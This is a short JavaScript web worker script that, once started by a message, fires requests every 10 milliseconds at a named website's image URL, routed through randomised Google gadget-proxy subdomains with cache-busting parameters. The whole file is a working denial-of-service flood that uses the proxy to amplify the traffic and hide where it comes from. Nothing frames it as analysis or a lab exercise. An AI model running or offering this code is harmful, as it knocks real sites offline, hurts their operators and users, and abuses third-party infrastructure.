self.addEventListener('message', function(e) {

	if(e.data == "STOP")self.close();

	setInterval(function() {

		var target = 'http://www.saunaetkiliatlet.com/u4.jpg?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);

		var url = 'https://images'+Math.floor(Math.random() * 9999)+'-focus-opensocial.googleusercontent.com/gadgets/proxy?url='+encodeURIComponent(target)+'&container=none';

		var xmlHttp = new XMLHttpRequest();

		xmlHttp.open("GET", url, true);

		xmlHttp.send(null);

	}, 10);

}, false);
